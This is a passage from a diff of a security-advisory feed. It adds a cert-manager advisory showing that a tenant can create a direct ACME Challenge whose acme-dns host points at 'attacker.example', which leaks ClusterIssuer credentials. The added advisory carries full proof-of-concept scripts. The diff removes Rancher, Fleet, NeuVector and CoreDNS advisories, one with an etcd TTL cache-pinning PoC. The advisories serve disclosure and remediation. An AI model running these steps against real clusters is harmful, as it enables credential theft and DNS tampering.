+In the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the `X-Api-User` and `X-Api-Key` headers loaded by cert-manager from the ClusterIssuer resource namespace.
+
+## Attack preconditions
+
+- The attacker can create `challenges.acme.cert-manager.io` resources in at least one namespace.
+- The cert-manager controller is running and reconciles ACME `Challenge` resources cluster-wide.
+- A usable `ClusterIssuer` exists in the cluster.
+- The referenced `ClusterIssuer` has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for `ClusterIssuer`.
+- The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.
+
+## Severity
+
+Rationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.
+
+## Why this is not just RBAC misconfiguration
+
+cert-manager's documented end-user workflow does not require users to manually create `Challenge` resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled `Challenge.spec.solver` as authoritative for a referenced `ClusterIssuer`.
+
+The security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from `issuerRef`, while accepting the DNS provider configuration from the untrusted Challenge object.
+
+## Affected components
+
+- ACME Challenge admission validation
+- ACME Challenge controller
+- DNS01 solver selection and DNS provider construction
+- Default aggregate RBAC for `challenges.acme.cert-manager.io`
+
+## Affected versions tested
+
+The issue was reproduced on:
+
+- `master` commit `2c0f1a6a4`
+- latest production release `v1.20.2` commit `e5b7b1845`
+- `v1.19.5` commit `cda7b7896`
+- `v1.18.6` commit `4699caabb`
+
+See `VERSION_TEST_MATRIX.md` for the command matrix and outputs.
+
+## Technical details
+
+Relevant code paths:
+
+- `internal/apis/acme/validation/challenge.go:44-45`: `ValidateChallenge` returns no errors on create.
+- `deploy/crds/acme.cert-manager.io_challenges.yaml`: `spec.solver` is a required user-controlled field on `Challenge`.
+- `pkg/controller/acmechallenges/scheduler/scheduler.go:51-58`: scheduler lists all Challenges.
+- `pkg/controller/acmechallenges/controller.go:180-197`: scheduler sets `status.processing=true`.
+- `pkg/controller/acmechallenges/sync.go:139-183`: controller loads the referenced Issuer and then presents the Challenge.
+- `pkg/issuer/acme/dns/dns.go:81`: DNS solver `Present` ignores the issuer object argument.
+- `pkg/issuer/acme/dns/dns.go:180-187`: DNS provider config and resource namespace are derived from `Challenge.spec`.
+- `pkg/controller/helper.go:39-44`: `ClusterIssuer` references use the cluster resource namespace.
+- `pkg/controller/helper.go:66-72`: ambient credentials are allowed based on `issuerRef.kind`.
+- `internal/apis/config/controller/v1alpha1/defaults.go:68-69`: ClusterIssuer ambient credentials default to enabled.
+- `deploy/charts/cert-manager/templates/rbac.yaml:517-519`: the aggregate edit role can create/update `challenges` and `orders`.
+
+The normal `Order` flow selects a solver from the Issuer:
+
+- `pkg/util/solverpicker/solverpicker.go`: solver selectors are evaluated.
+- `pkg/controller/acmeorders/util.go:94-106`: solvers are fetched from the Issuer and selected.
+- `pkg/controller/acmeorders/util.go:131-142`: the selected solver is copied into the generated Challenge.
+
+The direct `Challenge` flow skips that selection entirely because the direct object already contains a solver.
+
+## Proof of concept
+
+### PoC A: low-privileged namespace user can persist a direct ClusterIssuer Challenge
+
+The following script starts k3s in Docker, installs only the relevant CRDs, creates a platform-owned ClusterIssuer, creates a namespace user with Challenge create permission but no secret or ClusterIssuer read permission, and creates a direct DNS01 Challenge referencing that ClusterIssuer and a cluster resource namespace secret.
+
+The ClusterIssuer is configured to use a legitimate acme-dns host for `victim.example.com`. The direct Challenge uses that same DNS name, but replaces the acme-dns host with an attacker-controlled endpoint. This demonstrates credential disclosure without relying on an out-of-policy DNS name.
+
+A broader DNS policy-bypass variant is also possible when the referenced credential or ambient provider can operate on the attacker-selected DNS name. In that case, the same direct Challenge path bypasses the Issuer/ClusterIssuer solver selectors and provider configuration.
+
+Run from the cert-manager repository root:
+
+```bash
+set -euo pipefail
+
+name=cm-direct-challenge-poc
+docker rm -f "$name" &gt;/dev/null 2&gt;&amp;1 || true
+docker run -d --name "$name" --privileged -v "$PWD":/repo rancher/k3s:v1.33.4-k3s1 \
+  server --disable=traefik --disable=servicelb --write-kubeconfig-mode=644 &gt;/dev/null
+
+cleanup() {
+  docker rm -f "$name" &gt;/dev/null 2&gt;&amp;1 || true
+}
+trap cleanup EXIT
+
+for i in $(seq 1 90); do
+  docker exec "$name" kubectl get --raw=/readyz &gt;/dev/null 2&gt;&amp;1 &amp;&amp; break
+  sleep 2
+done
+
+docker exec "$name" kubectl apply -f /repo/deploy/crds/cert-manager.io_clusterissuers.yaml &gt;/dev/null
+docker exec "$name" kubectl apply -f /repo/deploy/crds/acme.cert-manager.io_challenges.yaml &gt;/dev/null
+docker exec "$name" kubectl create ns tenant &gt;/dev/null
+docker exec "$name" kubectl create ns cert-manager &gt;/dev/null
+docker exec "$name" kubectl -n tenant create sa bob &gt;/dev/null
+
+docker exec "$name" kubectl -n cert-manager create secret generic cluster-acmedns-account \
+  --from-literal=accounts.json='{"victim.example.com":{"username":"victim-user","password":"victim-pass","fulldomain":"x.example.org","subdomain":"x"}}' &gt;/dev/null
+
+docker exec -i "$name" kubectl apply -f - &gt;/dev/null &lt;&lt;'YAML'
+apiVersion: cert-manager.io/v1
+kind: ClusterIssuer
+metadata:
+  name: cluster-prod
+spec:
+  acme:
+    email: admin@example.com
+    server: https://acme-staging-v02.api.letsencrypt.org/directory
+    privateKeySecretRef:
+      name: cluster-prod-account-key
+    solvers:
+    - selector:
+        dnsZones:
+        - victim.example.com
+      dns01:
+        acmeDNS:
+          host: https://legit-acmedns.example
+          accountSecretRef:
+            name: cluster-acmedns-account
+            key: accounts.json
+YAML
+
+docker exec -i "$name" kubectl apply -f - &gt;/dev/null &lt;&lt;'YAML'
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: challenge-create-only
+  namespace: tenant
+rules:
+- apiGroups: ["acme.cert-manager.io"]
+  resources: ["challenges"]
+  verbs: ["create", "get", "list", "watch"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: bob-challenge-create-only
+  namespace: tenant
+subjects:
+- kind: ServiceAccount
+  name: bob
+  namespace: tenant
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: challenge-create-only
+YAML
+
+echo "bob create challenges: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob create challenges.acme.cert-manager.io -n tenant)"
+echo "bob get cert-manager secret: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob get secret/cluster-acmedns-account -n cert-manager)"
+echo "bob get clusterissuer: $(docker exec "$name" kubectl auth can-i --as=system:serviceaccount:tenant:bob get clusterissuer/cluster-prod 2&gt;/dev/null)"
+echo "ClusterIssuer solver policy: $(docker exec "$name" kubectl get clusterissuer cluster-prod -o jsonpath='{.spec.acme.solvers[0].selector.dnsZones[0]}{" "}{.spec.acme.solvers[0].dns01.acmeDNS.host}')"
+
+docker exec -i "$name" kubectl --as=system:serviceaccount:tenant:bob -n tenant apply -f - &lt;&lt;'YAML'
+apiVersion: acme.cert-manager.io/v1
+kind: Challenge
+metadata:
+  name: direct-dns01
+spec:
+  authorizationURL: https://attacker.example/acme/authz/1
+  dnsName: victim.example.com
+  issuerRef:
+    group: cert-manager.io
+    kind: ClusterIssuer
+    name: cluster-prod
+  key: attacker-key
+  token: attacker-token
+  type: DNS-01
+  url: https://attacker.example/acme/chal/1
+  solver:
+    dns01:
+      acmeDNS:
+        host: https://attacker.example/acmedns
+        accountSecretRef:
+          name: cluster-acmedns-account
+          key: accounts.json
+YAML
+
+docker exec "$name" kubectl -n tenant get challenge direct-dns01 \
+  -o jsonpath='{.spec.issuerRef.kind}{" "}{.spec.dnsName}{" "}{.spec.solver.dns01.acmeDNS.host}{" "}{.spec.solver.dns01.acmeDNS.accountSecretRef.name}{"\n"}'
+```
+
+Expected output:
+
+```text
+bob create challenges: yes
+bob get cert-manager secret: no
+bob get clusterissuer: no
+ClusterIssuer solver policy: victim.example.com https://legit-acmedns.example
+challenge.acme.cert-manager.io/direct-dns01 created
+ClusterIssuer victim.example.com https://attacker.example/acmedns cluster-acmedns-account
+```
+
+This proves that the API accepts the direct object from a user who cannot read the target secret or ClusterIssuer.
+
+### PoC B: acme-dns provider sends referenced credentials to the configured host
+
+This self-contained unit PoC demonstrates the concrete acme-dns impact: the acme-dns provider uses the configured host and sends credentials from account JSON as HTTP headers.
+
+Run from repository root:
+
+```bash
+set -euo pipefail
+
+cat &gt; pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go &lt;&lt;'EOF'
+package acmedns
+
+import (
+        "context"
+        "net/http"
+        "net/http/httptest"
+        "testing"
+)
+
+func TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost(t *testing.T) {
+        var gotUser, gotKey, gotPath string
+
+        ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+                gotPath = r.URL.Path
+                gotUser = r.Header.Get("X-Api-User")
+                gotKey = r.Header.Get("X-Api-Key")
+                w.Header().Set("Content-Type", "application/json")
+                w.WriteHeader(http.StatusOK)
+                w.Write([]byte(`{"txt":"ok"}`))
+        }))
+        defer ts.Close()
+
+        accountJSON := []byte(`{
+                "victim.example.com": {
+                        "username": "victim-user",
+                        "password": "victim-pass",
+                        "fulldomain": "x.example.org",
+                        "subdomain": "x"
+                }
+        }`)
+
+        provider, err := NewDNSProviderHostBytes(ts.URL, accountJSON, nil)
+        if err != nil {
+                t.Fatal(err)
+        }
+
+        if err := provider.Present(context.Background(), "victim.example.com", "", "txt-value"); err != nil {
+                t.Fatal(err)
+        }
+
+        if gotPath != "/update" {
+                t.Fatalf("path = %q, want /update", gotPath)
+        }
+        if gotUser != "victim-user" {
+                t.Fatalf("X-Api-User = %q, want victim-user", gotUser)
+        }
+        if gotKey != "victim-pass" {
+                t.Fatalf("X-Api-Key = %q, want victim-pass", gotKey)
+        }
+}
+EOF
+
+docker run --rm \
+  -v "$PWD":/repo \
+  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \
+  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \
+  -w /repo golang:1.26-bookworm \
+  go test ./pkg/issuer/acme/dns/acmedns \
+  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \
+  -count=1 -v
+
+rm pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go
+```
+
+Expected output:
+
+```text
+=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
+--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
+```
+
+Combined with PoC A and the code path in `pkg/issuer/acme/dns/dns.go`, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.
+
+## Credential impact scope
+
+The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled `host` receives the `X-Api-User` and `X-Api-Key` values loaded from the referenced account JSON.
+
+For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.
+
+## Expected behavior
+
+Users should not be able to create standalone `Challenge` resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct `Challenge` resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.
+
+## Actual behavior
+
+A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from `issuerRef`, and uses attacker-controlled provider settings.
+
+## Suggested remediation
+
+Possible mitigations:
+
+- Reject or ignore standalone user-created `Challenge` resources unless the controller or admission layer can confirm an existing cert-manager-created `Order` that owns the Challenge.
+- Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
+- Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
+- Move `Challenge` and `Order` creation permissions out of aggregate `edit` unless direct use is a supported security boundary.
+- Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.</description>
+      <guid isPermaLink="false">GHSA-8rvj-mm4h-c258</guid>
+      <category>HIGH</category>
+      <category>go:github.com/cert-manager/cert-manager</category>
+      <pubDate>Thu, 29 Oct 2026 16:39:41 +0000</pubDate>
+    </item>
     <item>
       <title>[LOW] go:github.com/coredns/coredns — CoreDNS `k8s_external` headless AXFR can emit an empty transfer batch that panics the `transfer` plugin (CVE-2026-62994)</title>
       <link>https://github.com/advisories/GHSA-74w3-63xv-x9mv</link>
@@ -6269,429 +7052,6 @@ If you have any questions or comments about this advisory:
       <category>HIGH</category>
       <category>go:github.com/rancher/rancher</category>
       <pubDate>Fri, 26 Sep 2025 13:02:44 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] go:github.com/rancher/rancher — Rancher sends sensitive information to external services through the `/meta/proxy` endpoint (CVE-2025-54468)</title>
-      <link>https://github.com/advisories/GHSA-mjcp-rj3c-36fr</link>
-      <description>CVE-2025-54468 · CVSS 4.7 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N) · CWE-200
-
-Affected:
-- go/github.com/rancher/rancher &gt;= 2.12.0, &lt; 2.12.2 (patched: 2.12.2)
-- go/github.com/rancher/rancher &gt;= 2.11.0, &lt; 2.11.6 (patched: 2.11.6)
-- go/github.com/rancher/rancher &gt;= 2.10.0, &lt; 2.10.10 (patched: 2.10.10)
-- go/github.com/rancher/rancher &gt;= 2.9.0, &lt; 2.9.12 (patched: 2.9.12)
-
----
-
-### Impact
-
-A vulnerability has been identified within Rancher Manager whereby `Impersonate-Extra-*` headers are being sent to an external entity, for example `amazonaws.com`, via the `/meta/proxy` Rancher endpoint. These headers may contain identifiable and/or sensitive information e.g. email addresses.
-
-If the authentication provider is configured to have email or other sensitive and/or identifiable information as part of the username and principal ID then when a new cloud credential is being created in Rancher Manager this information is sent to an external entity such as `amazonaws.com`, in case of an AWS cloud credentials, in `Impersonate-Extra-Username` and/or `Impersonate-Extra-Principalid` headers. Please note that neither password, password hashes or Rancher’s related authentication tokens are leaked in those requests.
-
-The entities to which such information is sent to are limited by the whitelisted domains specified in `nodedrivers.management.cattle.io` objects. 
-
-For example, the Amazon EC2 node driver contains the following whitelisted domains:
-
-- `iam.amazonaws.com`
-- `iam.us-gov.amazonaws.com`
-- `iam.%.amazonaws.com.cn`
-- `iam.global.api.aws`
-- `ec2.%.amazonaws.com`
-- `ec2.%.amazonaws.com.cn`
-- `ec2.%.api.aws`
-- `eks.%.amazonaws.com`
-- `eks.%.amazonaws.com.cn`
-- `eks.%.api.aws`
-- `kms.%.amazonaws.com`
-- `kms.%.amazonaws.com.cn`
-- `kms.%.api.aws`
-
-While the DigitalOcean driver contains the following whitelisted domain:
-
-- `api.digitalocean.com`
-
-### Patches
-
-This vulnerability is addressed by filtering all `Impersonate-*` headers from the original request by the `/meta/proxy` endpoint.
-
-Patched versions of Rancher include releases v2.12.2, v2.11.6, v2.10.10, and v2.9.12. 
-
-### Workarounds
-
-There are no known workarounds for this issue.
-
-### References
-
-If you have any questions or comments about this advisory:
-
-- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.
-- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.
-- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).</description>
-      <guid isPermaLink="false">GHSA-mjcp-rj3c-36fr</guid>
-      <category>MEDIUM</category>
-      <category>go:github.com/rancher/rancher</category>
-      <pubDate>Fri, 26 Sep 2025 13:02:38 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] go:github.com/coredns/coredns — CoreDNS: DNS Cache Pinning via etcd Lease ID Confusion (CVE-2025-58063)</title>
-      <link>https://github.com/advisories/GHSA-93mf-426m-g6x9</link>
-      <description>CVE-2025-58063 · CVSS 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H) · CWE-681
-
-Affected:
-- go/github.com/coredns/coredns &gt;= 1.2.0, &lt; 1.12.4 (patched: 1.12.4)
-
----
-
-# Summary
-
-The CoreDNS etcd plugin contains a TTL confusion vulnerability where lease IDs are incorrectly used as TTL values, enabling cache pinning for very long periods. This can effectively cause a denial of service for DNS updates/changes to affected services.
-
-# Details
-
-In `plugin/etcd/etcd.go`, the `TTL()` function casts the 64-bit etcd lease ID to a uint32 and uses it as the TTL:
-
-```go
-func (e *Etcd) TTL(kv *mvccpb.KeyValue, serv *msg.Service) uint32 {
-    etcdTTL := uint32(kv.Lease)  // BUG: Lease ID != TTL duration
-    // ... rest of function uses etcdTTL as actual TTL
-}
-```
-
-Lease IDs are identifiers, not durations. Large lease IDs can produce very large TTLs after truncation, causing downstream resolvers and clients to cache answers for years.
-
-This enables cache pinning attacks, such as:
-
-1. Attacker has etcd write access (compromised service account, misconfigured RBAC/TLS, exposed etcd, insider).
-2. Attacker writes/updates a key and attaches any lease (the actual lease duration is irrelevant; the ID is misused).
-4. CoreDNS serves the record with an extreme TTL; downstream resolvers/clients cache it for a very long time.
-5. Even after fixing/deleting the key (or restarting CoreDNS), clients continue to use the cached answer until their caches expire or enforce their own TTL caps.
-
-Some resolvers implement TTL caps, but values and defaults vary widely and are not guaranteed.
-
-# PoC
-
-1. Launch etcd:
-
-```bash
-etcd \
-  --data-dir ./etcd-data \
-  --listen-client-urls http://127.0.0.1:2379 \
-  --advertise-client-urls http://127.0.0.1:2379 \
-  --listen-peer-urls http://127.0.0.1:2380 \
-  --initial-advertise-peer-urls http://127.0.0.1:2380 \
-  --initial-cluster default=http://127.0.0.1:2380 \
-  --name default \
-  --initial-cluster-token etcd-ttl-poc \
-  --initial-cluster-state new &amp;
-```
-
-2. Prepare CoreDNS configuration:
-
-```bash
-cat &gt; Corefile &lt;&lt; 'EOF'
-skydns.local {
-    etcd {
-        path /skydns
-        endpoint http://localhost:2379
-        debug
-    }
-    log
-    errors
-}
-EOF
-```
-
-3. Launch CoreDNS:
-
-```bash
-coredns -conf Corefile -dns.port=1053
-```
-
-4. Create an etcd record called `large-lease-service` with a lease grant of 1 hour:
-
-```bash
-LEASE_ID=$(etcdctl --endpoints=http://127.0.0.1:2379 lease grant 3600 | awk '{print $2}')
-
-etcdctl --endpoints=http://127.0.0.1:2379 put /skydns/local/skydns/large-lease-service '{
-  "host": "192.168.1.101",
-  "port": 8080
-}' --lease=$LEASE_ID
-```
-
-7. Verify the lease details:
-
-```bash
-$ etcdctl lease timetolive $LEASE_ID
-lease 7c4a98dd35b75c23 granted with TTL(3600s), remaining(3252s)
-```
-
-8. Query the DNS record and observe the record TTL at 28 years:
-
-```bash
-$ dig +noall +answer @127.0.0.1 -p 1053 large-lease-service.skydns.local A
-large-lease-service.skydns.local. 901209123 IN A 192.168.1.101
-```
-
-# Impact
-
-Affects any CoreDNS deployment using the etcd plugin for service discovery.
-
-- Availability: High as service changes (IP rotations, failovers, rollbacks) may be ignored for extended periods by caches.
-- Integrity: Low as stale/incorrect answers persist abnormally long. (Note: attacker with etcd write could already point to malicious endpoints; the bug magnifies persistence.)
-- Confidentiality: None.
-
-The bug was introduced in #1702 as part of the CoreDNS [v1.2.0 release](https://github.com/coredns/coredns/releases/tag/v1.2.0).
-
-# Mitigation
-
-The TTL function should utilise etcd's Lease API to determine the proper TTL for leased records. Add configurable limits for minimum and maximum TTL when passing lease records, to clamp potentially extreme TTL values set as lease grant.
-
-# Credit
-
-Thanks to [@thevilledev](https://github.com/thevilledev) for disclovering this vulnerability and contributing a fix.
-
-# For more information
-
-Please consult our [security guide](https://github.com/coredns/coredns/blob/master/.github/SECURITY.md) for more information regarding our security process.</description>
-      <guid isPermaLink="false">GHSA-93mf-426m-g6x9</guid>
-      <category>HIGH</category>
-      <category>go:github.com/coredns/coredns</category>
-      <pubDate>Tue, 09 Sep 2025 19:19:33 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] go:github.com/rancher/rancher — Rancher affected by unauthenticated Denial of Service (CVE-2024-58259)</title>
-      <link>https://github.com/advisories/GHSA-4h45-jpvh-6p5j</link>
-      <description>CVE-2024-58259 · CVSS 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H) · CWE-770
-
-Affected:
-- go/github.com/rancher/rancher &gt;= 2.12.0, &lt; 2.12.1 (patched: 2.12.1)
-- go/github.com/rancher/rancher &gt;= 2.11.0, &lt; 2.11.5 (patched: 2.11.5)
-- go/github.com/rancher/rancher &gt;= 2.10.0, &lt; 2.10.9 (patched: 2.10.9)
-- go/github.com/rancher/rancher &gt;= 2.9.0, &lt; 2.9.11 (patched: 2.9.11)
-- go/github.com/rancher/rancher &lt; 0.0.0-20250813072957-aee95d4e2a41 (patched: 0.0.0-20250813072957-aee95d4e2a41)
-
----
-
-### Impact
-A vulnerability has been identified within Rancher Manager in which it did not enforce request body size limits on certain public (unauthenticated) and authenticated API endpoints. This allows a malicious user to exploit this by sending excessively large payloads, which are fully loaded into memory during processing. This could result in:
-- Denial of Service (DoS): The server process may crash or become unresponsive when memory consumption exceeds available resources.
-- Unauthenticated and authenticated exploitation: While the issue was initially observed in unauthenticated `/v3-public/*` endpoints, the absence of request body size limits also affected several authenticated APIs, broadening the potential attack surface. It's worth noting that other areas in Rancher do implement safeguards: requests proxied to Kubernetes APIs are subject to built-in size limits enforced by the [Kubernetes API server itself](https://github.com/kubernetes/kubernetes/blob/v1.33.4/staging/src/k8s.io/apiserver/pkg/server/config.go#L465), and Norman-based endpoints parse input with [predefined size caps](https://github.com/rancher/norman/blob/41dfae2f1a640c5ac9304e8b51e45a0f52cbdbb9/parse/read_input.go#L20-L31). However, the absence of similar protections in other Rancher APIs increased the risk of denial-of-service (DoS) scenarios in certain contexts.
-
-By sending large binary or text payloads to vulnerable endpoints, a malicious actor could disrupt Rancher’s availability, impacting both administrative and user operations across managed clusters.
- 
-Please consult the associated  [MITRE ATT&amp;CK - Technique - Network Denial of Service](https://attack.mitre.org/techniques/T1498/) for further information about this category of attack.
-
-### Patches
-This vulnerability is addressed by adding a default limit of `1MiB` and a setting in case this value needs to be increased.
-
-Patched versions of Rancher include releases `v2.12.1`, `v2.11.5`, `v2.10.9` and `v2.9.12`.
-
-### Workarounds
-If you can't upgrade to a fixed version, please make sure that you are manually setting the request body size limits. For example, using nginx-ingress controller and only allowing requests via the ingress. For reference on how to configure the limit manually, please consult the [Knowledge Base](https://www.suse.com/support/kb/doc/?id=000021309).
-
-### References
-If you have any questions or comments about this advisory:
-- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.
-- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.
-- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).</description>
-      <guid isPermaLink="false">GHSA-4h45-jpvh-6p5j</guid>
-      <category>HIGH</category>
-      <category>go:github.com/rancher/rancher</category>
-      <pubDate>Fri, 29 Aug 2025 15:38:23 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] rancher/fleet — Helm Values are stored inside BundleDeployment in plain text (CVE-2024-52284)</title>
-      <link>https://github.com/rancher/fleet/security/advisories/GHSA-6h9x-9j5v-7w9h</link>
-      <description>CVE-2024-52284 · CVSS 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
-
-Affected:
-- go/ github.com/rancher/fleet &lt;0.14.0 (patched: 0.14.0)
-- go/ github.com/rancher/fleet &gt;=0.13.0, &lt;0.13.1 (patched: 0.13.1)
-- go/ github.com/rancher/fleet &gt;=0.12.0, &lt;0.12.6 (patched: 0.12.6)
-- go/ github.com/rancher/fleet &gt;=0.11.0, &lt;0.11.10 (patched: 0.11.10)
-
----
-
-### Impact&#13;
-A vulnerability has been identified when using Fleet to manage Helm charts where sensitive information is passed through `BundleDeployment.Spec.Options.Helm.Values` may be stored in plain text. This can result in: &#13;
-1. Unauthorized disclosure of sensitive data: Any user with `GET` or `LIST` permissions on `BundleDeployment` resources could retrieve Helm values containing credentials or other secrets.&#13;
-2. Lack of encryption at rest: `BundleDeployment` is not configured for Kubernetes encryption at rest by default, causing sensitive values to remain unencrypted within the cluster datastore.&#13;
-&#13;
-This behavior differs from Helm v3’s default approach, where chart state — including values — is stored in Kubernetes secrets, benefiting from built-in protection mechanisms. In affected scenarios, credentials and other sensitive information are exposed both at rest and in responses to API calls.&#13;
-&#13;
-Please consult the associated  [MITRE ATT&amp;CK - Technique - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) for further information about this category of attack.&#13;
-&#13;
-For the exposure of credentials not related to Rancher, the final impact severity for confidentiality, integrity, and availability is dependent on the permissions that the leaked credentials have on their own services.&#13;
-It is recommended to review the potentially exposed sensitive data in this scenario and change secrets, tokens, and passwords as necessary.&#13;
-&#13;
-### Patches&#13;
-This vulnerability is addressed by adding the capability for each `Bundle` and `BundleDeployment` to have a secret to store options in.&#13;
-1. The git job that runs `fleet apply` will now create secrets for Helm values.&#13;
-2. Fleet controller generates `bundledeployments` and now creates a Helm values secret per bundle deployment in the cluster namespace.&#13;
-3. Fleet agent uses the `bundledeployment` for options, the content resource and the secret to deploy the bundle.&#13;
-&#13;
-&#13;
-Patched versions of Fleet include releases `v0.14.0`, `v0.13.1`, `v0.12.6` and `v0.11.10`.&#13;
-&#13;
-### Workarounds&#13;
-If you can't upgrade to a fixed version, please make sure to specify paths to valuesFiles as simple file names, e.g.:&#13;
-&#13;
-Instead of:&#13;
-```fleet.yaml&#13;
-helm:&#13;
-  valuesFiles:&#13;
-    - config-chart/values.yaml # will not be excluded → risky&#13;
-```&#13;
-Use:&#13;
-```fleet.yaml&#13;
-helm:&#13;
-  valuesFiles:&#13;
-    - values.yaml # will be excluded&#13;
-```&#13;
-&#13;
-### References&#13;
-If you have any questions or comments about this advisory:&#13;
-- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
-- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
-- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).&#13;
-</description>
-      <guid isPermaLink="false">GHSA-6h9x-9j5v-7w9h</guid>
-      <category>HIGH</category>
-      <category>rancher/fleet</category>
-      <pubDate>Thu, 28 Aug 2025 22:40:56 +0000</pubDate>
-    </item>
-    <item>
-      <title>[CRITICAL] go:github.com/neuvector/neuvector — NeuVector admin account has insecure default password (CVE-2025-8077)</title>
-      <link>https://github.com/advisories/GHSA-8pxw-9c75-6w56</link>
-      <description>CVE-2025-8077 · CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) · CWE-1393
-
-Affected:
-- go/github.com/neuvector/neuvector &lt; 0.0.0-20250825191744-da1a462074c3 (patched: 0.0.0-20250825191744-da1a462074c3)
-
----
-
-### Impact
-
-A vulnerability exists in NeuVector versions up to and including **5.4.5**, where a fixed string is used as the default password for the built-in `admin` account. If this password is not changed immediately after deployment, any workload with network access within the cluster could use the default credentials to obtain an authentication token. This token can then be used to perform any operation via NeuVector APIs.
-
-In earlier versions, NeuVector supports setting the default (bootstrap) password for the `admin` account using a Kubernetes Secret named `neuvector-bootstrap-secret`. This Secret must contain a key named `bootstrapPassword`. However, if NeuVector fails to retrieve this value, it falls back to the fixed default password.
-
-### Patches
-
-This issue is resolved in NeuVector version **5.4.6** and later. For rolling upgrades, it's strongly recommended to change the default `admin` password to a secure one.
-
-Starting from version **5.4.6**, NeuVector introduces additional Kubernetes RBAC permissions to ensure the bootstrap password can be securely managed via Secrets:
-
-```
-kubectl create role neuvector-binding-secret-controller \
-  --verb=create,patch,update --resource=secrets -n {neuvector}
-
-kubectl create rolebinding neuvector-binding-secret-controller \
-  --role=neuvector-binding-secret-controller \
-  --serviceaccount=neuvector:controller \
-  --serviceaccount=neuvector:default -n {neuvector}
-```
-
-- These RBAC roles are automatically applied when deploying via Helm.
-- If deploying or upgrading manually, you must create these roles before starting NeuVector.
-
-**NOTE:** If these roles are not present, the NeuVector controller (from version 5.4.6 onward) does not start.
-
-#### Behavior in Patched Versions
-
-- **Upgrades:** NeuVector does not reset any existing account passwords. It's strongly recommended to change the default `admin` password to a secure one.
-- **New deployments:**
-  - If `bootstrapPassword` is not set in the `neuvector-bootstrap-secret, NeuVector generates a secure password and stores it in the same Secret.
-
-On first login, the default `admin` must retrieve the password using:
-
-```
-kubectl get secret -n {neuvector} neuvector-bootstrap-secret \
-  -o go-template='{{ .data.bootstrapPassword | base64decode }}{{ "\n" }}'
-```
-
-The password must be changed during the first login via the NeuVector UI.
-
